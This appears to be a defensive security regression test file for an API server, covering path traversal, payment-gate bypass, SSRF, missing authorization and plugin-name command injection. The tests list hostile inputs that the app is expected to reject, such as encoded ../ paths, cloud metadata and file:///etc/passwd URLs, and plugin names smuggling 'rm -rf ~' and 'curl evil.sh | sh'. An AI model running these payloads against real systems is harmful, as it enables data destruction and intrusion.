// Copyright (c) 2024-2026 nich (@nichxbt). Licensed under the Apache License, Version 2.0.
/**
 * Security regressions for the API server.
 *
 * Each block reproduces a vulnerability that was found in the real app and
 * asserts it stays closed. The app is booted through createApp() with stub env,
 * as in contract.test.js, so no Postgres or Redis is needed.
 *
 * @author nich (@nichxbt)
 * @license Apache-2.0
 */

import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import request from 'supertest';

// A private home, so dataset paths resolve inside it. Set before any import
// that computes ~/.xactions.
const HOME = fs.mkdtempSync(path.join(os.tmpdir(), 'xactions-sec-'));
process.env.HOME = HOME;
process.env.NODE_ENV = 'test';
process.env.JWT_SECRET = 'security-test-jwt-secret';
process.env.SESSION_SECRET = 'security-test-session-secret';
process.env.DATABASE_URL = 'postgresql://user:password@127.0.0.1:1/xactions?schema=public';
process.env.REDIS_HOST = '127.0.0.1';
process.env.REDIS_PORT = '1';
process.env.XACTIONS_NO_TELEMETRY = '1';

let app;
let io;

beforeAll(async () => {
  const server = await import('../../api/server.js');
  ({ app, io } = server.createApp({ rateLimiting: false }));
});

afterAll(() => {
  io?.close();
  fs.rmSync(HOME, { recursive: true, force: true });
});

describe('datasets: path traversal', () => {
  it('the store refuses any name that could leave the datasets directory', async () => {
    const { DatasetStore, InvalidDatasetNameError } = await import('../../src/scraping/paginationEngine.js');
    for (const name of ['..', '../victim', '../../../victim', 'a/b', 'a\\b', '.hidden', '', 'x'.repeat(200), '/etc']) {
      expect(() => new DatasetStore(name), name).toThrow(InvalidDatasetNameError);
    }
    expect(new DatasetStore('trending-hashtags_2026.v1').name).toBe('trending-hashtags_2026.v1');
  });

  it('an unauthenticated DELETE with an encoded ../ no longer deletes anything', async () => {
    const victim = path.join(HOME, 'victim');
    fs.mkdirSync(victim, { recursive: true });
    fs.writeFileSync(path.join(victim, 'keep.txt'), 'still here');

    const res = await request(app).delete('/api/datasets/..%2F..%2Fvictim');

    expect(res.status).toBe(401);
    expect(fs.existsSync(path.join(victim, 'keep.txt'))).toBe(true);
  });

  it('read and export are closed to anonymous callers too', async () => {
    expect((await request(app).get('/api/datasets')).status).toBe(401);
    expect((await request(app).get('/api/datasets/..%2F..%2Fetc')).status).toBe(401);
    expect((await request(app).get('/api/datasets/x/export')).status).toBe(401);
  });
});

describe('x402: the payment gate cannot be skipped by URL spelling', () => {
  it('normalises the path the way Express routes it', async () => {
    const { paymentGatePath } = await import('../../api/utils/paymentGatePath.js');
    expect(paymentGatePath('/API/ai/posting/tweet')).toBe('/api/ai/posting/tweet');
    expect(paymentGatePath('/api/Scripts/run')).toBe('/api/scripts/run');
    expect(paymentGatePath('//api//ai//health/')).toBe('/api/ai/health');
  });

  it('gates mixed-case paths exactly like the canonical one', async () => {
    // Outside production an unconfigured gate lets the request through but
    // marks it, which proves the gate saw it as a paid path.
    for (const url of ['/api/ai/posting/tweet', '/API/ai/posting/tweet', '/api/AI/Posting/Tweet', '/api/Scripts/run']) {
      const res = await request(app).post(url).send({});
      expect(res.headers['x-payment-bypassed'], url).toMatch(/x402-not-configured/);
    }
  });

  it('leaves the free endpoints free in any spelling', async () => {
    for (const url of ['/api/ai/health', '/API/AI/HEALTH', '/api/ai/pricing/']) {
      const res = await request(app).get(url);
      expect(res.headers['x-payment-bypassed'], url).toBeUndefined();
    }
  });
});

describe('callback URLs cannot reach the server\'s own network', () => {
  const lookupTo = (address) => async () => [{ address, family: address.includes(':') ? 6 : 4 }];

  it('refuses loopback, metadata, private and mapped addresses, and non-http schemes', async () => {
    const { assertPublicUrl, PublicUrlError } = await import('../../api/utils/publicUrl.js');
    for (const url of ['http://127.0.0.1/x', 'http://169.254.169.254/latest/meta-data/', 'http://10.0.0.5/', 'http://[::1]/', 'http://[::ffff:192.168.1.1]/', 'file:///etc/passwd', 'not a url']) {
      await expect(assertPublicUrl(url, 'callbackUrl'), url).rejects.toBeInstanceOf(PublicUrlError);
    }
    await expect(assertPublicUrl('https://internal.example/', 'callbackUrl', lookupTo('192.168.0.9'))).rejects.toThrow(/private or local address/);
    await expect(assertPublicUrl('https://hooks.example/', 'callbackUrl', lookupTo('93.184.216.34'))).resolves.toBeInstanceOf(URL);
  });

  it('lets a self-hosted operator opt in to internal hosts', async () => {
    const { assertPublicUrl } = await import('../../api/utils/publicUrl.js');
    process.env.XACTIONS_WEBHOOK_ALLOW_PRIVATE = 'true';
    try {
      await expect(assertPublicUrl('http://10.0.0.5/hook', 'callbackUrl')).resolves.toBeInstanceOf(URL);
    } finally {
      delete process.env.XACTIONS_WEBHOOK_ALLOW_PRIVATE;
    }
  });

  it('A2A tasks need an account, so no anonymous caller can run paid skills free', async () => {
    const res = await request(app).post('/api/a2a/task').send({ skill: 'xactions.x_get_profile', input: {}, callbackUrl: 'http://127.0.0.1/' });
    expect(res.status).toBe(401);
  });
});

describe('routes that once had no authorization', () => {
  it('teams, agent control and the operator-wide routes refuse anonymous callers', async () => {
    const calls = [
      ['post', '/api/teams', { name: 'poc', owner: 'attacker' }],
      ['get', '/api/teams/t1/members'],
      ['post', '/api/teams/t1/invite', { email: 'a@b.c' }],
      ['delete', '/api/teams/t1/members/someone'],
      ['get', '/api/teams/t1/activity'],
      ['post', '/api/agent/start', { configPath: '/etc/passwd' }],
      ['get', '/api/agent/status'],
      ['get', '/api/agent/actions'],
      ['post', '/api/schedule', { name: '../../x', cron: '* * * * *', command: 'help' }],
      ['post', '/api/notifications/configure', {}],
      ['delete', '/api/streams'],
    ];
    for (const [method, url, body] of calls) {
      const res = await request(app)[method](url).send(body || {});
      expect(res.status, `${method.toUpperCase()} ${url}`).toBe(401);
    }
  });

  it('scheduler job names cannot leave the history directory', async () => {
    const { Scheduler } = await import('../../src/scheduler/scheduler.js');
    const scheduler = new Scheduler();
    for (const name of ['../../escape', 'a/b', '.hidden', '']) {
      expect(() => scheduler.addJob({ name, cron: '0 0 1 1 *', command: 'help', enabled: false }), name).toThrow(/Invalid job name|requires/);
    }
  });
});

describe('plugin install cannot run a shell command', () => {
  it('accepts only whole npm package names in the plugin namespace', async () => {
    const { isValidPluginName } = await import('../../src/plugins/loader.js');
    for (const name of ['xactions-plugin-foo', 'xactions-plugin-foo@1.2.3', '@xactions/bar', '@xactions/bar@^2.0.0']) {
      expect(isValidPluginName(name), name).toBe(true);
    }
    for (const name of ['xactions-plugin-x; rm -rf ~', 'xactions-plugin-x && curl evil.sh | sh', 'xactions-plugin-$(id)', '@xactions/a b', 'left-pad']) {
      expect(isValidPluginName(name), name).toBe(false);
    }
  });
});

describe('trust proxy', () => {
  it('is on only when configured or on a platform with one proxy in front', async () => {
    const { resolveTrustProxy } = await import('../../api/server.js');
    expect(resolveTrustProxy({})).toBe(false);
    expect(resolveTrustProxy({ TRUST_PROXY: '2' })).toBe(2);
    expect(resolveTrustProxy({ TRUST_PROXY: 'loopback' })).toBe('loopback');
    expect(resolveTrustProxy({ TRUST_PROXY: 'false', FLY_APP_NAME: 'x' })).toBe(false);
    expect(resolveTrustProxy({ RAILWAY_ENVIRONMENT: 'production' })).toBe(1);
  });
});

describe('static file caching', () => {
  // Nothing under public/ or dashboard/ is content-hashed, so a fix to
  // /js/analytics.js has to reach a returning visitor within minutes.
  it('revalidates scripts, styles, HTML and data within five minutes and caches nothing as immutable', async () => {
    for (const url of ['/js/analytics.js', '/css/common.css', '/about.html', '/data/ask-actions.json', '/badges/live.json']) {
      const res = await request(app).get(url);
      expect(res.status, url).toBe(200);
      expect(res.headers['cache-control'], url).toBe('public, max-age=300, must-revalidate');
      expect(res.headers.etag, url).toBeTruthy();
    }
    for (const url of ['/icon-192.png', '/favicon.ico', '/logo.png']) {
      const res = await request(app).get(url);
      expect(res.status, url).toBe(200);
      expect(res.headers['cache-control'], url).toBe('public, max-age=86400');
    }
  });

  it('the GCP nginx config caches nothing as immutable either', () => {
    const conf = fs.readFileSync(path.join(import.meta.dirname, '../../deploy/gcp/nginx.conf'), 'utf8');
    const directives = conf.split('\n').filter((line) => !line.trim().startsWith('#')).join('\n');
    expect(directives).not.toMatch(/immutable|max-age=31536000/);
    expect(directives).toMatch(/default "public, max-age=300, must-revalidate"/);
  });
});
